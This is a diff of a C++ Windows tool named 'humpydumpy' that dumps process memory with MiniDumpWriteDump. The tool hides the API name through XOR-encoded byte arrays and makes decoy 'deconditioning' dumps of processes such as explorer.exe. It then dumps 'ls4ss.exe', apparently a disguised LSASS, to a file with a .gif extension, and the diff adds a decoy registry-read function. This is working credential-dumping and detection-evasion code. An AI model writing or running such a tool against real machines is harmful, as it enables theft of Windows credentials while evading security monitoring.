@@ -32,6 +32,17 @@ void bla2() {
     );
 }
 
+void bla3() {
+    HKEY hKey;
+    RegOpenKeyEx(
+        HKEY_LOCAL_MACHINE,
+        L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion",
+        0,
+        KEY_READ, // Access rights
+        &hKey     // Output handle to the opened key
+    );
+}
+
 
 // Anti Emulation
 
@@ -75,7 +86,7 @@ bool resolve_func() {
     BYTE dumpLibraryBytes[] = { 0x25,0x21,0x26,0x2b,0x24,0x2f,0x31,0x6d,0x25,0x2f,0x2d,0x43 };
     for (size_t i = 0; i < sizeof(dumpLibraryBytes); ++i) { dumpLibraryBytes[i] ^= ((i & 1) == 0 ? 0x41 : 0x43); }
 
-	// MiniDumpWriteDump\0
+    // MiniDumpWriteDump\0
     // https://cyberchef.org/#recipe=Unescape_string()XOR(%7B'option':'UTF8','string':'AC'%7D,'Standard',false)To_Hex('0x%20with%20comma',0)&input=TWluaUR1bXBXcml0ZUR1bXBcMA
     BYTE dumpFunctionBytes[] = { 0x0c,0x2a,0x2f,0x2a,0x05,0x36,0x2c,0x33,0x16,0x31,0x28,0x37,0x24,0x07,0x34,0x2e,0x31,0x43 };
     for (size_t i = 0; i < sizeof(dumpFunctionBytes); ++i) { dumpFunctionBytes[i] ^= ((i & 1) == 0 ? 0x41 : 0x43); }
@@ -100,7 +111,7 @@ bool resolve_func() {
 
 
 bool dump_process(DWORD pid) {
-	std::string dumpFileName = std::to_string(pid) + ".gif";
+    std::string dumpFileName = std::to_string(pid) + ".gif";
 
     HANDLE hFile = CreateFileA(dumpFileName.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
     if (hFile == INVALID_HANDLE_VALUE) {
@@ -127,7 +138,7 @@ bool dump_process(DWORD pid) {
     std::cout << "  Dump created successfully\n";
 
     CloseHandle(hFile);
-	CloseHandle(hProcess);
+    CloseHandle(hProcess);
 
     return true;
 }
@@ -140,11 +151,11 @@ void deconditioning(unsigned int deconDumps) {
         , L"explorer.exe"
     };
 
-    for(int i=0; i<deconDumps; i++) {
+    for (int i = 0; i < deconDumps; i++) {
         DWORD pid = ProcessCache::GetPid(procsDump[i % procsDump.size()]);
-		std::wcout << L"Deconditioning dump for " << std::wstring(procsDump[i % procsDump.size()]) << L" with pid " << pid << std::endl;
+        std::wcout << L"Deconditioning dump for " << std::wstring(procsDump[i % procsDump.size()]) << L" with pid " << pid << std::endl;
         dump_process(pid);
-	}
+    }
 }
 
 
@@ -157,7 +168,7 @@ void dump_ls4ss() {
 
     DWORD lsa4sPid = ProcessCache::GetPid(procW);
     if (lsa4sPid != 0) {
-		std::cout << "Dumping ls4ss.exe with pid " << lsa4sPid << std::endl;
+        std::cout << "Dumping ls4ss.exe with pid " << lsa4sPid << std::endl;
         if (dump_process(lsa4sPid)) {
             std::cout << "  ls4ss.exe dumped successfully with pid " << lsa4sPid << std::endl;
         }
@@ -173,14 +184,14 @@ void dump_ls4ss() {
 
 int main(int argc, char* argv[]) {
     bool deconditioning_flag = false;
-	bool dump_ls4ss_flag = false;
+    bool dump_ls4ss_flag = false;
     if (argc != 3) {
         std::cout << "Usage: humpydumpy <deconditioning> <dumpls4ss>\n";
-		return 1;
+        return 1;
     }
     else {
         if (argv[1][0] == '1') {
-			deconditioning_flag = true;
+            deconditioning_flag = true;
         }
         if (argv[2][0] == '1') {
             dump_ls4ss_flag = true;
@@ -191,10 +202,10 @@ int main(int argc, char* argv[]) {
     //antiemulation();
 
     std::cout << "2 Resolve\n";
-    if (! resolve_func()) {
+    if (!resolve_func()) {
         std::cerr << "Failed to resolve functions\n";
         return 1;
-	}
+    }
 
     if (deconditioning_flag) {
         std::cout << "3 Decon\n";
@@ -202,7 +213,7 @@ int main(int argc, char* argv[]) {
     }
 
     if (dump_ls4ss_flag) {
-		std::cout << "Dumping ls4ss\n";
+        std::cout << "Dumping ls4ss\n";
         dump_ls4ss();
     }
     else {
@@ -215,7 +226,8 @@ int main(int argc, char* argv[]) {
     if (argc == 42) {
         bla1();
         bla2();
+        bla3();
     }
 
-	return 0;
+    return 0;
 }
